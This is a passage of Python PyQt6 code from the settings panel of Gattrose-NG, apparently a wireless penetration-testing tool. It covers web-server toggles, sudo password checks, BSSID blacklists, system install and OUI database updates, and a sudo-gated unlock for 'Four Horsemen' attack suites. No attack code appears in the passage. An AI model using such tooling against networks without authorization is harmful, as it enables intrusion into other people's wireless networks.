            self.auto_spoof_mac_checkbox.setChecked(auto_spoof == 'true')
            self.auto_spoof_mac_checkbox.blockSignals(False)

        except Exception as e:
            print(f"[!] Error loading auto-spoof MAC state: {e}")

    def on_minimize_to_tray_toggled(self, state):
        """Handle minimize-to-tray checkbox toggle"""
        enabled = (state == Qt.CheckState.Checked.value)

        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()

            if enabled:
                config.set('app.minimize_to_tray_on_close', 'true', value_type='string', category='app',
                          description='Minimize to system tray instead of closing when window is closed')
                print("[*] Minimize to tray enabled - closing window will hide to tray")
            else:
                config.set('app.minimize_to_tray_on_close', 'false', value_type='string', category='app',
                          description='Minimize to system tray instead of closing when window is closed')
                print("[*] Minimize to tray disabled - closing window will exit application")

        except Exception as e:
            print(f"[!] Error toggling minimize to tray: {e}")

    def load_minimize_to_tray_state(self):
        """Load and set the minimize-to-tray checkbox state from config"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()
            minimize_to_tray = config.get('app.minimize_to_tray_on_close', 'true')  # Default to true

            # Set checkbox state without triggering signal
            self.minimize_to_tray_checkbox.blockSignals(True)
            self.minimize_to_tray_checkbox.setChecked(minimize_to_tray == 'true')
            self.minimize_to_tray_checkbox.blockSignals(False)

        except Exception as e:
            print(f"[!] Error loading minimize-to-tray state: {e}")

    def on_web_server_toggled(self, state):
        """Handle web server checkbox toggle"""
        enabled = (state == Qt.CheckState.Checked.value)

        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()

            if enabled:
                config.set('app.web_server_enabled', 'true', value_type='string', category='app',
                          description='Enable HTTPS web server for mobile control')
                print("[*] Web server enabled in config")
            else:
                config.set('app.web_server_enabled', 'false', value_type='string', category='app',
                          description='Enable HTTPS web server for mobile control')
                print("[*] Web server disabled in config")
                # Stop web server if running
                self.stop_web_server()

        except Exception as e:
            print(f"[!] Error toggling web server: {e}")

    def on_web_server_button_clicked(self):
        """Handle web server start/stop button click"""
        # Check if server is running
        if hasattr(self, 'web_server_running') and self.web_server_running:
            self.stop_web_server()
        else:
            self.start_web_server()

    def start_web_server(self):
        """Start the HTTPS web server (requires sudo password)"""
        try:
            # Prompt for sudo password
            password, ok = QInputDialog.getText(
                self,
                "Sudo Authentication Required",
                "Web server requires sudo privileges.\n\n"
                "⚠️ SECURITY NOTICE:\n"
                "• Server will auto-stop after 2 hours\n"
                "• This timeout CANNOT be changed\n"
                "• Server is OFF by default at startup\n"
                "• Re-authentication required after timeout\n\n"
                "Enter your sudo password:",
                QLineEdit.EchoMode.Password
            )

            if not ok or not password:
                print("[*] Web server start cancelled")
                return

            print("[*] Starting web server...")

            # Import web server module
            from ..services.web_server import WebServerManager

            port = self.web_server_port_input.value()
            hostname = self.get_hostname()

            # Initialize web server
            self.web_server_manager = WebServerManager(port=port)

            # Generate SSL certificate if needed
            if not self.web_server_manager.cert_exists():
                print("[*] Generating self-signed SSL certificate...")
                self.web_server_manager.generate_certificate(hostname)

            # Start server with sudo password
            self.web_server_manager.start(sudo_password=password)

            # Update UI
            self.web_server_running = True
            self.web_server_button.setText("Stop Web Server")
            self.web_server_status_label.setText("Status: Running (2h timeout)")
            self.web_server_status_label.setStyleSheet("color: #00ff88; font-weight: bold;")
            self.web_server_url_label.setText(f"https://{hostname}:{port}")

            # Start timeout monitor
            self.start_web_server_timeout_monitor()

            print(f"[✓] Web server started at https://{hostname}:{port}")
            print(f"[!] Server will auto-stop in 2 hours")

            QMessageBox.information(
                self,
                "Web Server Started",
                f"Web server is now running at:\n\n"
                f"https://{hostname}:{port}\n\n"
                f"⚠️ SECURITY: Server will auto-stop after 2 hours.\n"
                f"You will need to re-authenticate to continue."
            )

        except Exception as e:
            print(f"[!] Error starting web server: {e}")
            QMessageBox.critical(
                self,
                "Web Server Error",
                f"Failed to start web server:\n\n{str(e)}\n\n"
                f"Make sure you entered the correct sudo password."
            )

    def stop_web_server(self):
        """Stop the HTTPS web server"""
        try:
            if hasattr(self, 'web_server_manager'):
                print("[*] Stopping web server...")
                self.web_server_manager.stop()

            # Stop timeout monitor
            if hasattr(self, 'web_server_timeout_timer'):
                self.web_server_timeout_timer.stop()

            # Update UI
            self.web_server_running = False
            self.web_server_button.setText("Start Web Server")
            self.web_server_status_label.setText("Status: Stopped")
            self.web_server_status_label.setStyleSheet("")
            self.web_server_url_label.setText("Not running")

            print("[✓] Web server stopped")

        except Exception as e:
            print(f"[!] Error stopping web server: {e}")

    def start_web_server_timeout_monitor(self):
        """Start monitoring for 2-hour timeout"""
        # Create timer to check every minute
        self.web_server_timeout_timer = QTimer()
        self.web_server_timeout_timer.timeout.connect(self.check_web_server_timeout)
        self.web_server_timeout_timer.start(60000)  # Check every minute

    def check_web_server_timeout(self):
        """Check if web server has reached 2-hour timeout"""
        if not hasattr(self, 'web_server_manager') or not self.web_server_manager:
            return

        # Check timeout
        if self.web_server_manager.check_timeout():
            print("[!] Web server 2-hour timeout reached - stopping server")

            # IMPORTANT: Stop the server FIRST, before showing modal
            self.web_server_manager.stop()
            self.web_server_running = False

            # Stop the timer
            if hasattr(self, 'web_server_timeout_timer'):
                self.web_server_timeout_timer.stop()

            # Update UI
            self.web_server_button.setText("Start Web Server")
            self.web_server_status_label.setText("Status: Stopped (Timeout)")
            self.web_server_status_label.setStyleSheet("color: #ff3366; font-weight: bold;")
            self.web_server_url_label.setText("Not running")

            # Show modal with 60-second auto-close
            self.show_timeout_warning_modal()

        else:
            # Update remaining time in status
            remaining = self.web_server_manager.get_remaining_time()
            hours = remaining // 60
            minutes = remaining % 60

            if hours > 0:
                time_str = f"{hours}h {minutes}m remaining"
            else:
                time_str = f"{minutes}m remaining"

            self.web_server_status_label.setText(f"Status: Running ({time_str})")

    def show_timeout_warning_modal(self):
        """Show timeout warning with 60-second auto-close"""
        # Create custom message box that we can control
        msg_box = QMessageBox(self)
        msg_box.setWindowTitle("⚠️ Web Server Timeout")
        msg_box.setIcon(QMessageBox.Icon.Warning)
        msg_box.setText(
            "The web server has automatically stopped after 2 hours.\n\n"
            "This is a security measure that CANNOT be disabled.\n\n"
            "To restart the server, click 'Start Web Server' and\n"
            "enter your sudo password again.\n\n"
            "This message will auto-close in 60 seconds."
        )
        msg_box.setStandardButtons(QMessageBox.StandardButton.Ok)

        # Create timer for auto-close (60 seconds)
        auto_close_timer = QTimer()
        auto_close_timer.setSingleShot(True)
        auto_close_timer.timeout.connect(msg_box.close)
        auto_close_timer.start(60000)  # 60 seconds

        # Show the dialog (blocks until user clicks OK or timer closes it)
        msg_box.exec()

        # Clean up timer
        auto_close_timer.stop()
        auto_close_timer.deleteLater()

        print("[*] Timeout warning dismissed (will not ask again)")

    def get_hostname(self):
        """Get system hostname"""
        import socket
        try:
            return socket.gethostname()
        except:
            return "localhost"

    def load_web_server_state(self):
        """Load and set web server state from config"""
        try:
            # SECURITY: Web server is ALWAYS off by default
            # Checkbox reflects preference but server never auto-starts

            # Set checkbox state (always unchecked at startup)
            self.enable_web_server_checkbox.blockSignals(True)
            self.enable_web_server_checkbox.setChecked(False)
            self.enable_web_server_checkbox.blockSignals(False)

            # Initialize server state (always stopped)
            self.web_server_running = False

            print("[*] Web server state: OFF (default security policy)")

        except Exception as e:
            print(f"[!] Error loading web server state: {e}")

    def update_horsemen_status_label(self):
        """Update the Horsemen status label based on current unlock state"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()
            unlocked = config.get('app.horsemen_unlocked', 'false') == 'true'

            if unlocked:
                self.horsemen_status_label.setText("🔓 Status: UNLOCKED")
                self.horsemen_status_label.setStyleSheet("""
                    font-size: 12px;
                    font-weight: bold;
                    color: #00ff00;
                    background-color: #002200;
                    border: 2px solid #00ff00;
                    border-radius: 5px;
                    padding: 5px 10px;
                """)
            else:
                self.horsemen_status_label.setText("🔒 Status: LOCKED")
                self.horsemen_status_label.setStyleSheet("""
                    font-size: 12px;
                    font-weight: bold;
                    color: #ff0000;
                    background-color: #220000;
                    border: 2px solid #ff0000;
                    border-radius: 5px;
                    padding: 5px 10px;
                """)
        except Exception as e:
            print(f"[!] Error updating Horsemen status label: {e}")

    def update_horsemen_unlock_button(self):
        """Update the Horsemen unlock/lock button based on current state"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()
            unlocked = config.get('app.horsemen_unlocked', 'false') == 'true'

            if unlocked:
                self.horsemen_unlock_btn.setText("🔓 Lock Horsemen")
                self.horsemen_unlock_btn.setStyleSheet("""
                    QPushButton {
                        background-color: #ff0000;
                        color: #ffffff;
                        font-weight: bold;
                        border: 2px solid #aa0000;
                        border-radius: 5px;
                        padding: 8px 15px;
                    }
                    QPushButton:hover {
                        background-color: #cc0000;
                        border: 2px solid #ff0000;
                    }
                """)
            else:
                self.horsemen_unlock_btn.setText("🔒 Unlock Horsemen")
                self.horsemen_unlock_btn.setStyleSheet("""
                    QPushButton {
                        background-color: #ff6600;
                        color: #ffffff;
                        font-weight: bold;
                        border: 2px solid #cc4400;
                        border-radius: 5px;
                        padding: 8px 15px;
                    }
                    QPushButton:hover {
                        background-color: #ff8800;
                        border: 2px solid #ff6600;
                    }
                """)
        except Exception as e:
            print(f"[!] Error updating Horsemen unlock button: {e}")

    def verify_sudo_password(self, password: str) -> bool:
        """
        Verify sudo password by attempting to run a harmless sudo command

        Args:
            password: The password to verify

        Returns:
            True if password is correct, False otherwise
        """
        import subprocess

        try:
            # Use 'sudo -S true' to verify password
            # -S reads password from stdin
            # 'true' is a harmless command that always succeeds
            process = subprocess.Popen(
                ['sudo', '-S', 'true'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Send password + newline
            stdout, stderr = process.communicate(input=password + '\n', timeout=5)

            # If return code is 0, password was correct
            return process.returncode == 0

        except subprocess.TimeoutExpired:
            print("[!] Sudo password verification timed out")
            return False
        except Exception as e:
            print(f"[!] Error verifying sudo password: {e}")
            return False

    def on_toggle_horsemen_unlock(self):
        """Handle Horsemen unlock/lock button click"""
        from PyQt6.QtWidgets import QInputDialog, QMessageBox, QLineEdit
        from ..utils.config_db import DBConfig

        try:
            config = DBConfig()
            currently_unlocked = config.get('app.horsemen_unlocked', 'false') == 'true'

            if currently_unlocked:
                # Locking - require confirmation but no password
                reply = QMessageBox.question(
                    self,
                    "Lock Four Horsemen",
                    "Are you sure you want to lock the Four Horsemen attack suites?\n\n"
                    "The tabs will be hidden after restart.",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                    QMessageBox.StandardButton.No
                )

                if reply == QMessageBox.StandardButton.Yes:
                    config.set('app.horsemen_unlocked', 'false', value_type='string', category='app',
                              description='Enable Four Horsemen advanced attack tabs')
                    print("[*] Four Horsemen locked")

                    # Update UI
                    self.update_horsemen_status_label()
                    self.update_horsemen_unlock_button()
                    self.horsemen_restart_notice.setVisible(True)

                    QMessageBox.information(
                        self,
                        "Horsemen Locked",
                        "Four Horsemen attack suites have been locked.\n\n"
                        "Please restart Gattrose for changes to take effect."
                    )
            else:
                # Unlocking - require sudo password
                password, ok = QInputDialog.getText(
                    self,
                    "🔐 Sudo Authentication Required",
                    "⚠️ WARNING: You are about to unlock DANGEROUS attack protocols ⚠️\n\n"
                    "The Four Horsemen attacks are LOUD, AGGRESSIVE, and WILL be detected.\n"
                    "Use ONLY with explicit authorization.\n\n"
                    "Enter your sudo password to unlock:",
                    QLineEdit.EchoMode.Password
                )

                if ok and password:
                    print("[*] Verifying sudo password...")

                    if self.verify_sudo_password(password):
                        # Password correct - unlock
                        config.set('app.horsemen_unlocked', 'true', value_type='string', category='app',
                                  description='Enable Four Horsemen advanced attack tabs')
                        print("[*] Four Horsemen unlocked")

                        # Update UI
                        self.update_horsemen_status_label()
                        self.update_horsemen_unlock_button()
                        self.horsemen_restart_notice.setVisible(True)

                        QMessageBox.warning(
                            self,
                            "⚠️ Horsemen Unlocked ⚠️",
                            "Four Horsemen attack suites have been UNLOCKED.\n\n"
                            "⚠️ DANGER: These attacks are LOUD and AGGRESSIVE ⚠️\n"
                            "They WILL be detected by security systems.\n\n"
                            "Use ONLY with explicit written authorization.\n\n"
                            "Please restart Gattrose to access the Horsemen tabs."
                        )
                    else:
                        # Password incorrect
                        QMessageBox.critical(
                            self,
                            "Authentication Failed",
                            "Incorrect sudo password.\n\n"
                            "Four Horsemen remain locked."
                        )
                        print("[!] Sudo authentication failed")

        except Exception as e:
            print(f"[!] Error toggling Horsemen unlock: {e}")
            QMessageBox.critical(
                self,
                "Error",
                f"Failed to toggle Horsemen unlock state:\n{e}"
            )

    def on_show_blacklisted_toggled(self, state):
        """Handle show blacklisted APs checkbox toggle"""
        enabled = (state == Qt.CheckState.Checked.value)

        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()

            config.set('app.show_blacklisted_aps', 'true' if enabled else 'false',
                      value_type='string', category='app',
                      description='Show blacklisted APs in scan results with marker')

            print(f"[*] Show blacklisted APs: {enabled}")

            # Notify user to restart scan for changes to take effect
            if self.main_window and hasattr(self.main_window, 'scanner_tab'):
                scanner = self.main_window.scanner_tab
                if hasattr(scanner, 'scanner') and scanner.scanner and scanner.scanner.isRunning():
                    QMessageBox.information(
                        self,
                        "Setting Changed",
                        "Blacklist display setting updated.\n\n"
                        "Restart the scan for changes to take effect."
                    )

        except Exception as e:
            print(f"[!] Error toggling show blacklisted: {e}")

    def on_add_to_blacklist(self):
        """Add a BSSID to the blacklist"""
        bssid, ok = QInputDialog.getText(
            self,
            "Add to Blacklist",
            "Enter BSSID to blacklist (MAC address):\n\nFormat: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX",
            QLineEdit.EchoMode.Normal
        )

        if ok and bssid:
            # Validate BSSID format
            import re
            bssid = bssid.strip().upper()
            mac_pattern = r'^([0-9A-F]{2}[:-]){5}([0-9A-F]{2})$'

            if not re.match(mac_pattern, bssid):
                QMessageBox.warning(
                    self,
                    "Invalid BSSID",
                    f"Invalid BSSID format: {bssid}\n\n"
                    f"Please use format: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX"
                )
                return

            # Normalize to colon format
            bssid = bssid.replace('-', ':')

            # Get current blacklist
            blacklist = self.get_blacklist()

            if bssid in blacklist:
                QMessageBox.information(
                    self,
                    "Already Blacklisted",
                    f"BSSID {bssid} is already in the blacklist."
                )
                return

            # Add to blacklist
            blacklist.append(bssid)
            self.save_blacklist(blacklist)
            self.refresh_blacklist_display()

            QMessageBox.information(
                self,
                "Added to Blacklist",
                f"✓ BSSID {bssid} added to blacklist.\n\n"
                f"This AP and its clients will be hidden in future scans."
            )

            print(f"[+] Added {bssid} to blacklist")

    def on_remove_from_blacklist(self):
        """Remove selected BSSID from blacklist"""
        # Get selected text from blacklist widget
        cursor = self.blacklist_widget.textCursor()
        selected_text = cursor.selectedText().strip()

        if not selected_text:
            QMessageBox.warning(
                self,
                "No Selection",
                "Please select a BSSID to remove from the blacklist."
            )
            return

        # Extract BSSID from selected line
        import re
        mac_pattern = r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})'
        match = re.search(mac_pattern, selected_text)

        if not match:
            QMessageBox.warning(
                self,
                "Invalid Selection",
                "Could not find a valid BSSID in the selection."
            )
            return

        bssid = match.group(0)

        # Confirm removal
        reply = QMessageBox.question(
            self,
            "Remove from Blacklist",
            f"Remove {bssid} from blacklist?\n\n"
            f"This AP will appear in future scans.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        )

        if reply == QMessageBox.StandardButton.Yes:
            blacklist = self.get_blacklist()
            if bssid in blacklist:
                blacklist.remove(bssid)
                self.save_blacklist(blacklist)
                self.refresh_blacklist_display()
                print(f"[+] Removed {bssid} from blacklist")
            else:
                QMessageBox.warning(self, "Not Found", f"{bssid} not in blacklist")

    def on_clear_blacklist(self):
        """Clear the entire blacklist"""
        blacklist = self.get_blacklist()

        if not blacklist:
            QMessageBox.information(
                self,
                "Blacklist Empty",
                "The blacklist is already empty."
            )
            return

        reply = QMessageBox.question(
            self,
            "Clear Blacklist",
            f"Clear all {len(blacklist)} BSSIDs from blacklist?\n\n"
            f"All blacklisted APs will appear in future scans.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        )

        if reply == QMessageBox.StandardButton.Yes:
            self.save_blacklist([])
            self.refresh_blacklist_display()
            QMessageBox.information(
                self,
                "Blacklist Cleared",
                "✓ All BSSIDs removed from blacklist"
            )
            print("[+] Blacklist cleared")

    def get_blacklist(self):
        """Get list of blacklisted BSSIDs from config"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()
            blacklist_str = config.get('app.bssid_blacklist', '')

            if not blacklist_str:
                return []

            return [b.strip().upper() for b in blacklist_str.split(',') if b.strip()]

        except Exception as e:
            print(f"[!] Error getting blacklist: {e}")
            return []

    def save_blacklist(self, blacklist):
        """Save blacklist to config"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()

            blacklist_str = ','.join(blacklist)
            config.set('app.bssid_blacklist', blacklist_str,
                      value_type='string', category='app',
                      description='Comma-separated list of blacklisted BSSIDs')

        except Exception as e:
            print(f"[!] Error saving blacklist: {e}")

    def refresh_blacklist_display(self):
        """Refresh the blacklist display widget"""
        blacklist = self.get_blacklist()

        if not blacklist:
            self.blacklist_widget.setPlainText("")
            self.blacklist_widget.setPlaceholderText("No BSSIDs blacklisted")
        else:
            display_text = "\n".join([f"⛔ {bssid}" for bssid in blacklist])
            self.blacklist_widget.setPlainText(display_text)

    def load_blacklist_state(self):
        """Load and display blacklist settings from config"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()

            # Load show blacklisted checkbox state
            show_blacklisted = config.get('app.show_blacklisted_aps', 'false')
            self.show_blacklisted_checkbox.blockSignals(True)
            self.show_blacklisted_checkbox.setChecked(show_blacklisted == 'true')
            self.show_blacklisted_checkbox.blockSignals(False)

            # Load and display blacklist
            self.refresh_blacklist_display()

        except Exception as e:
            print(f"[!] Error loading blacklist state: {e}")

    def on_create_desktop_shortcut(self):
        """Create desktop shortcut symlink"""
        from pathlib import Path
        import os
        import pwd

        try:
            # Get paths
            project_root = Path(__file__).parent.parent.parent  # Go up from src/gui/main_window.py
            desktop_file = project_root / "assets" / "gattrose-ng.desktop"

            # Detect actual user (not root when using sudo)
            sudo_user = os.environ.get('SUDO_USER')
            if sudo_user:
                # Running with sudo - use the actual user's home
                try:
                    user_info = pwd.getpwnam(sudo_user)
                    user_home = Path(user_info.pw_dir)
                    print(f"[*] Detected sudo user: {sudo_user}, home: {user_home}")
                except KeyError:
                    # Fallback to HOME env var
                    user_home = Path(os.environ.get('HOME', Path.home()))
            else:
                # Not running with sudo
                user_home = Path.home()

            desktop_dir = user_home / "Desktop"

            # Check if desktop file exists
            if not desktop_file.exists():
                QMessageBox.warning(
                    self,
                    "File Not Found",
                    f"Desktop file not found at:\n{desktop_file}\n\n"
                    f"Please ensure gattrose-ng.desktop exists in the assets/ directory."
                )
                return

            # Create Desktop directory if it doesn't exist
            if not desktop_dir.exists():
                desktop_dir.mkdir(parents=True)
                # Set correct ownership if running as root
                if sudo_user:
                    try:
                        user_info = pwd.getpwnam(sudo_user)
                        os.chown(desktop_dir, user_info.pw_uid, user_info.pw_gid)
                    except Exception as e:
                        print(f"[!] Warning: Could not set ownership: {e}")

            # Symlink path
            symlink_path = desktop_dir / "gattrose-ng.desktop"

            # Check if symlink already exists
            if symlink_path.exists() or symlink_path.is_symlink():
                reply = QMessageBox.question(
                    self,
                    "Shortcut Exists",
                    f"A shortcut already exists at:\n{symlink_path}\n\n"
                    f"Do you want to replace it?",
                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                    QMessageBox.StandardButton.No
                )

                if reply == QMessageBox.StandardButton.No:
                    return

                # Remove existing symlink/file
                symlink_path.unlink()

            # Create symlink
            symlink_path.symlink_to(desktop_file)

            # Make executable
            os.chmod(symlink_path, 0o755)

            # Set correct ownership if running as root
            if sudo_user:
                try:
                    user_info = pwd.getpwnam(sudo_user)
                    # Use lchown to change symlink ownership without following it
                    os.lchown(symlink_path, user_info.pw_uid, user_info.pw_gid)
                    print(f"[+] Set ownership to {sudo_user} ({user_info.pw_uid}:{user_info.pw_gid})")
                except Exception as e:
                    print(f"[!] Warning: Could not set symlink ownership: {e}")

            QMessageBox.information(
                self,
                "Shortcut Created",
                f"✓ Desktop shortcut created successfully!\n\n"
                f"Symlink: {symlink_path}\n"
                f"Target: {desktop_file}\n\n"
                f"User: {sudo_user if sudo_user else 'current user'}\n"
                f"Desktop: {desktop_dir}\n\n"
                f"You can now launch Gattrose-NG from your desktop."
            )

            print(f"[+] Desktop shortcut created: {symlink_path} -> {desktop_file}")

        except PermissionError:
            QMessageBox.critical(
                self,
                "Permission Error",
                f"Permission denied creating desktop shortcut.\n\n"
                f"Try running the application with appropriate permissions."
            )
        except Exception as e:
            QMessageBox.critical(
                self,
                "Error",
                f"Error creating desktop shortcut:\n{e}"
            )
            print(f"[!] Error creating desktop shortcut: {e}")

    def on_install_to_system(self):
        """Install Gattrose-NG system-wide"""
        from pathlib import Path
        import subprocess

        # Confirm action
        reply = QMessageBox.question(
            self,
            "Install to System",
            "Install Gattrose-NG system-wide?\n\n"
            "This will:\n"
            "• Install PolicyKit policy to /usr/share/polkit-1/actions/\n"
            "• Install systemd services to /etc/systemd/system/\n"
            "• Install desktop launcher to ~/.local/share/applications/\n"
            "• Run boot verification to ensure everything works\n\n"
            "Requires sudo authentication.\n\n"
            "After installation, the application will restart from the system installation.\n\n"
            "Proceed with installation?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        )

        if reply == QMessageBox.StandardButton.No:
            return

        try:
            # Get project root
            project_root = Path(__file__).parent.parent.parent

            # Run boot verification which handles all installations
            boot_verify_script = project_root / "src" / "core" / "boot_verify.py"

            if not boot_verify_script.exists():
                QMessageBox.critical(
                    self,
                    "Script Not Found",
                    f"Boot verification script not found at:\n{boot_verify_script}"
                )
                return

            # Show progress dialog
            progress = QMessageBox(self)
            progress.setWindowTitle("Installing...")
            progress.setText("Installing Gattrose-NG to system...\nPlease wait...")
            progress.setStandardButtons(QMessageBox.StandardButton.NoButton)
            progress.show()
            QApplication.processEvents()

            # Run boot verification with sudo
            result = subprocess.run(
                [str(project_root / ".venv" / "bin" / "python"), str(boot_verify_script)],
                capture_output=True,
                text=True,
                timeout=60
            )

            progress.close()

            if result.returncode == 0:
                QMessageBox.information(
                    self,
                    "Installation Complete",
                    "✓ Gattrose-NG has been installed system-wide!\n\n"
                    "Installation Summary:\n"
                    "• PolicyKit policy installed\n"
                    "• Systemd services installed\n"
                    "• Desktop launcher installed\n"
                    "• All system integrations verified\n\n"
                    "The application will now restart from the system installation."
                )

                # Restart application from system
                subprocess.Popen([str(project_root / "gattrose-ng.py")])
                QApplication.quit()

            else:
                QMessageBox.warning(
                    self,
                    "Installation Issues",
                    f"Installation completed with some warnings:\n\n{result.stdout}\n\n{result.stderr}\n\n"
                    f"Check the output above for details."
                )

        except subprocess.TimeoutExpired:
            QMessageBox.critical(
                self,
                "Installation Timeout",
                "Installation timed out after 60 seconds.\n\n"
                "Please check system logs and try again."
            )
        except Exception as e:
            QMessageBox.critical(
                self,
                "Installation Failed",
                f"Failed to install Gattrose-NG:\n\n{e}"
            )
            print(f"[!] Installation error: {e}")
            import traceback
            traceback.print_exc()

    def on_update_oui(self):
        """Update OUI database"""
        from pathlib import Path
        import subprocess

        # Confirm action
        reply = QMessageBox.question(
            self,
            "Update OUI Database",
            "Download and update the IEEE OUI database?\n\n"
            "This will:\n"
            "• Download latest OUI database from IEEE\n"
            "• Update manufacturer identification data\n"
            "• Improve MAC address vendor lookup accuracy\n\n"
            "Download size: ~2-5 MB\n"
            "Time: ~10-30 seconds\n\n"
            "Proceed with update?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        )

        if reply == QMessageBox.StandardButton.No:
            return

        try:
            # Get project root
            project_root = Path(__file__).parent.parent.parent

            # Check for OUI update script
            oui_update_script = project_root / "src" / "utils" / "oui_update.py"

            if not oui_update_script.exists():
                QMessageBox.warning(
                    self,
                    "Script Not Found",
                    f"OUI update script not found at:\n{oui_update_script}\n\n"
                    "Feature may not be implemented yet."
                )
                return

            # Show progress dialog
            progress = QMessageBox(self)
            progress.setWindowTitle("Updating OUI Database...")
            progress.setText("Downloading IEEE OUI database...\nPlease wait...")
            progress.setStandardButtons(QMessageBox.StandardButton.NoButton)
            progress.show()
            QApplication.processEvents()

            # Run OUI update script
            result = subprocess.run(
                [str(project_root / ".venv" / "bin" / "python"), str(oui_update_script)],
                capture_output=True,
                text=True,
                timeout=120
            )

            progress.close()

            if result.returncode == 0:
                QMessageBox.information(
                    self,
                    "OUI Database Updated",
                    "✓ OUI database has been updated successfully!\n\n"
                    f"{result.stdout}\n\n"
                    "Manufacturer identification is now up to date."
                )
            else:
                QMessageBox.warning(
                    self,
                    "Update Failed",
                    f"Failed to update OUI database:\n\n{result.stderr}\n\n"
                    "Please check your internet connection and try again."
                )

        except subprocess.TimeoutExpired:
            QMessageBox.critical(
                self,
                "Update Timeout",
                "OUI database update timed out after 120 seconds.\n\n"
                "Please check your internet connection and try again."
            )
        except Exception as e:
            QMessageBox.critical(
                self,
                "Update Failed",
                f"Failed to update OUI database:\n\n{e}"
            )
            print(f"[!] OUI update error: {e}")
            import traceback
            traceback.print_exc()

    def backup_database(self):
        """Backup the database"""
        QMessageBox.information(
            self,
            "Backup Database",
            "Database backup functionality will be implemented here.\n\n"
            "The database will be backed up to:\ndata/backups/gattrose_backup_YYYYMMDD_HHMMSS.db"
        )

    def optimize_database(self):
        """Optimize the database"""
        QMessageBox.information(
            self,
            "Optimize Database",
            "Database optimization (VACUUM) will be implemented here.\n\n"
            "This will reclaim unused space and improve performance."
        )

    def refresh_oui_stats(self):
        """Refresh OUI database statistics"""
        try:
            from ..utils.oui_downloader import OUIDownloader
            from datetime import datetime

            downloader = OUIDownloader()
            stats = downloader.get_database_stats()

            total = stats.get('total_records', 0)
            ieee = stats.get('ieee_records', 0)
            wireshark = stats.get('wireshark_records', 0)
            last_update = stats.get('last_update')

            if last_update:
                age_days = (datetime.utcnow() - last_update).days
                last_update_str = f"{last_update.strftime('%Y-%m-%d %H:%M')} ({age_days} days ago)"
            else:
                last_update_str = "Never updated"

            stats_text = f"""
<b>📊 OUI Database Statistics:</b><br>
• Total vendors: <b>{total:,}</b><br>
• IEEE records: {ieee:,}<br>
• Wireshark records: {wireshark:,}<br>
• Last update: {last_update_str}<br>
<br>
<i>💡 Recommended: Update every 30-60 days</i>
            """

            self.oui_stats_label.setText(stats_text)

        except Exception as e:
            self.oui_stats_label.setText(f"❌ Error loading stats: {e}")

    def update_oui_database(self):
        """Update OUI database from online sources"""
        from PyQt6.QtWidgets import QMessageBox
        from PyQt6.QtCore import QThread, pyqtSignal

        # Confirm with user
        reply = QMessageBox.question(
            self,
            "Update OUI Database",
            "This will download the latest MAC vendor database from IEEE and Wireshark.\n\n"
            "The download may take a few minutes and will download ~2-5 MB of data.\n\n"
            "Continue?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )

        if reply != QMessageBox.StandardButton.Yes:
            return

        # Disable button and show progress
        self.update_oui_btn.setEnabled(False)
        self.oui_progress.setVisible(True)
        self.oui_progress.setRange(0, 0)  # Indeterminate
        self.oui_stats_label.setText("⏳ Downloading OUI database...")

        # Create worker thread
        class OUIUpdateWorker(QThread):
            finished = pyqtSignal(dict)
            error = pyqtSignal(str)

            def run(self):
                try:
                    from ...utils.oui_downloader import OUIDownloader
                    downloader = OUIDownloader()
                    stats = downloader.update_database(source='all')
                    self.finished.emit(stats)
                except Exception as e:
                    self.error.emit(str(e))

        def on_update_finished(stats):
            self.update_oui_btn.setEnabled(True)
            self.oui_progress.setVisible(False)

            if stats.get('success'):
                QMessageBox.information(
                    self,
                    "Update Complete",
                    f"✅ OUI database updated successfully!\n\n"
                    f"Added: {stats['records_added']:,}\n"
                    f"Updated: {stats['records_updated']:,}\n"
                    f"Total: {stats['records_total']:,}\n\n"
                    f"The vendor lookup feature will now have the latest data."
                )
                self.refresh_oui_stats()
            else:
                QMessageBox.warning(
                    self,
                    "Update Failed",
                    "❌ Failed to update OUI database.\n\n"
                    "Please check your internet connection and try again."
                )
                self.refresh_oui_stats()

        def on_update_error(error):
            self.update_oui_btn.setEnabled(True)
            self.oui_progress.setVisible(False)
            QMessageBox.critical(
                self,
                "Update Error",
                f"❌ Error updating OUI database:\n\n{error}"
            )
            self.refresh_oui_stats()

        self.oui_worker = OUIUpdateWorker()
        self.oui_worker.finished.connect(on_update_finished)
        self.oui_worker.error.connect(on_update_error)
        self.oui_worker.start()

    def set_main_window(self, window):
        """Set reference to main window for theme changes"""
        self.main_window = window

    def refresh_system_status(self):
        """Refresh system component status display"""
        from ..core.system_status import SystemStatusChecker

        # Clear existing items
        self.status_tree.clear()

        # Get component status
        summary = SystemStatusChecker.get_summary()

        # Create category items
        wifi_category = QTreeWidgetItem(self.status_tree, ["WiFi Tools", "", "", ""])
        bt_category = QTreeWidgetItem(self.status_tree, ["Bluetooth Tools", "", "", ""])
        sdr_category = QTreeWidgetItem(self.status_tree, ["SDR Tools", "", "", ""])
        python_category = QTreeWidgetItem(self.status_tree, ["Python Environment", "", "", ""])
        other_category = QTreeWidgetItem(self.status_tree, ["Other Components", "", "", ""])

        # Make categories bold
        from PyQt6.QtGui import QFont
        bold_font = QFont()
        bold_font.setBold(True)

        for category in [wifi_category, bt_category, sdr_category, python_category, other_category]:
            category.setFont(0, bold_font)
